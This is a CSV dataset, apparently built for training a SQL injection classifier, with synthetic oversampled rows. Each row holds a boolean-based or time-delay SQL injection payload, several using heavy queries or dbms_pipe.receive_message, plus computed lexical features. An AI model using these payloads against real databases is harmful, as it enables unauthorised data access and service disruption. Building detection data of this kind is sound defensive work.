id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000180,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000293,0.05444395654695754,123.75834908311533,28.97157048036651,3.5748010868120783,45.82942288219906,13.0,51.91471144109953,13.014214759816745,0.3702113641520484,0.1050754794934806,0.419504828638404,0.105208327716067,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.014214759816745,0.0,7.97157048036651,0.028429519633490052,0.0,0.0,1.014214759816745,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000181,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000126,0.08142408555143474,89.51377010014868,19.0,2.882847143103122,13.999999999999996,12.87033869337298,47.74067738674596,14.902754020029736,0.15656403238487682,0.14365206979283487,0.5333333333333333,0.16645056448895496,4.0,1.1102230246251565e-16,0.0,0.0,0.9675846733432449,2.0,0.0,7.93516934668649,0.0,0.0,0.0,2.967584673343245,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.9116242618019846,71.8199672281024,22.75426698748709,3.5889933641935903,20.065700240615318,13.0,27.377133493743543,11.377133493743544,0.27907271198374,0.18139177612639548,0.38139346433040644,0.15814204755945813,4.0,1.1102230246251565e-16,0.0,0.0,0.3114332531282278,1.6885667468717722,0.0,4.0,0.0,0.6885667468717722,0.6885667468717723,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000183,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.21135245913453277,134.24508206856086,31.89624316095326,4.252459088949628,74.58497264381305,9.0,35.34883890760759,15.311270517140214,0.5562053516455832,0.06708811311293504,0.2627463201649334,0.11396021507654838,0.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.311270517140214,0.0,0.0,3.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000184,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000119,0.7829432025618336,130.49061875342375,34.24798973287652,3.809252723093219,46.0,13.746649554794198,52.24530937671188,18.49865982191768,0.35332285679990716,0.10476938800006631,0.40014788829567843,0.1417598669043481,2.0,3.74932991095884,0.0,1.0,0.0,1.0,0.0,9.749329910958838,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2506700890411603,0.0,0.0,0.0,1.0,0.7493299109588397,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000185,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,0.9779239704544979,79.57646224997103,23.270613250086917,3.5106732064753507,13.0,24.0,32.0,10.576462249971026,0.16337120106809758,0.30160837120264167,0.40214449493685556,0.1328759327924052,0.0,0.5764622499710272,3.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,0.0,6.0,0.0,0.576462249971027,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000186,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",nearest_attack_euclidean,R000222,0.8600622029710905,120.82373269709176,31.17626730290824,3.8203487045694042,49.29493078836704,10.0,45.35253460581648,16.17626730290824,0.40795454480288046,0.08276602431329769,0.3753848977916436,0.1338945330921783,2.0,3.0,0.0,1.0,0.0,0.17626730290823933,0.0,9.0,0.0,0.0,1.0,1.176267302908239,1.0,1.0,0.0,0.0,0.0,0.17626730290823933,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.675536963799465,131.11367174244626,31.528417935611564,4.223476525044088,74.05683587122313,8.764208967805782,33.29262690341734,15.0,0.5648742129437117,0.06680401485931745,0.2538378670021855,0.11448390519478532,0.2357910321942185,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.0,0.23579103219421838,0.0,2.7642089678057813,4.0,0.23579103219421838,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000188,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000057,0.09405811555843564,61.046430669291574,26.83749265747949,3.9284764994423678,11.930353996062642,15.930353996062639,20.185722677166297,13.0,0.19547083677551969,0.2609962797426895,0.3305751938384888,0.21295768964330197,0.0,4.0,0.9767846653542128,0.0,0.0,2.0,0.0,2.046430669291575,1.9999999999999998,0.9767846653542128,1.0,2.976784665354213,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.023215334645787,0.9767846653542129,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000189,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000221,0.5167064409294209,67.86316195371172,21.83062164057166,3.3193532393267455,7.491864921714985,16.0,30.03254031314006,14.338756718856677,0.11168000574645714,0.23655832521460302,0.44037369656893266,0.21138797247000718,0.0,4.0,1.0,0.0,0.1693783594283383,2.0,0.0,4.338756718856677,1.9999999999999998,0.0,0.8306216405716617,3.1693783594283382,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000190,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000304,0.5242644384065389,168.67841557007813,34.91189437133854,3.891287861400439,55.08810562866146,25.030838084723975,66.29515497070835,22.26431688598437,0.32685636055097345,0.1479925491302104,0.3929306452305572,0.13222044508825898,4.0,0.35242251464582797,0.9118943713385431,0.0,0.0,2.0,0.0,9.823788742677085,0.1762112573229138,0.0,0.0,6.911894371338542,1.0,0.08810562866145683,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.088105628661457,0.911894371338543,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000191,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.4525417933953338,91.76547764630814,28.703567061075596,3.6448324673588584,23.06191058523254,16.0,38.46904470738373,14.234522353691865,0.2512331952138077,0.1743612467342415,0.4192622984376008,0.15514325961434994,4.0,1.1102230246251565e-16,1.0,0.0,0.0,1.2345223536918655,0.0,6.0,0.0,1.0,1.0,2.2345223536918652,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000183,0.05610263960389381,122.81800803850888,32.017782783445845,3.803296819982102,46.711311337833806,12.911086082770773,47.142262267566764,16.053348350337536,0.3794472879315142,0.10550928950026438,0.38421690177757745,0.13082652079064389,0.0,4.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.9822172165541546,1.0177827834458453,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000193,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000279,1.1306289535177867,124.43023281706735,30.56976718293265,4.077462800989825,67.5813969024041,8.0,33.279068731730604,15.569767182932651,0.5430405214702406,0.06429407338473943,0.26751912091207986,0.12514628423294005,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.569767182932651,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5697671829326507,0.4302328170673493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000194,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.6914279897909057,121.76339471005637,28.436383774161968,4.091668717163082,75.0,5.0,25.636162258380313,16.12723245167606,0.6174423414409977,0.041162822762733184,0.20903052143188008,0.13236431436438903,0.0,3.0,0.0,0.0,1.0,0.0,0.0,3.1272324516760626,0.0,5.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000195,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000244,1.5307011111657727,133.5248237052171,34.0,3.760106936280435,37.0,15.0,54.60401975434759,26.92080395086952,0.2776552189122191,0.11256292658603478,0.4080956106749797,0.20168624382676636,0.539598024565241,0.46040197543475914,2.0,0.0,0.0,1.0,0.0,11.92080395086952,1.0,2.0,1.0,9.0,0.539598024565241,0.460401975434759,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000196,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000136,0.5718756947509257,82.67106627272268,22.164466863638662,3.209777596275091,13.822334318193306,15.506599409084016,39.671066272722676,13.671066272722678,0.16741482773533387,0.1874625450826135,0.4798238657931095,0.16529876138894312,0.0,4.0,0.8355331363613387,0.0,1.0,1.8355331363613387,0.0,6.0,0.0,0.0,0.0,3.6710662727226775,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1644668636386613,0.8355331363613387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000197,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000213,0.1509369286209601,142.0323274379422,35.0,4.050699183085717,58.70905305852027,10.16163718971096,49.129309751768766,24.032327437942193,0.4133644349192992,0.07153694506842975,0.3458966778435929,0.16920194216867815,2.9353451241156154,1.1102230246251565e-16,0.06465487588438446,0.0,0.0,1.0,0.0,10.032327437942191,0.0,2.0,1.0,7.064654875884385,1.0,0.0,0.03232743794219223,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9676725620578078,0.0,0.0,0.9676725620578077,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9353451241156154
SMOTE_000198,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000053,0.5756426340760744,160.10983273797808,34.77803345240439,4.167208966263262,79.66589964278685,16.389016726202193,46.66589964278685,17.389016726202193,0.49747391736232344,0.10255152911345859,0.29117143400602297,0.10880311951819496,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.610983273797808,0.0,0.0,2.389016726202192,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000199,attack,boolean,"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000249,0.05812141487055774,77.0,20.741028814332836,2.9755076463661574,5.0,16.0,40.0,16.0,0.0649350649350649,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,1.9999999999999998,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000200,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000225,0.7762353418549007,91.54903708141536,27.54903708141536,3.6846994213664317,31.0,13.0,35.0,12.54903708141536,0.33864821581899135,0.14201376792409315,0.3823447597956354,0.1369932564612801,0.0,0.27451854070768045,2.0,0.0,1.0,1.0,0.0,6.0,0.27451854070768034,1.0,1.0,4.0,0.0,0.27451854070768034,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
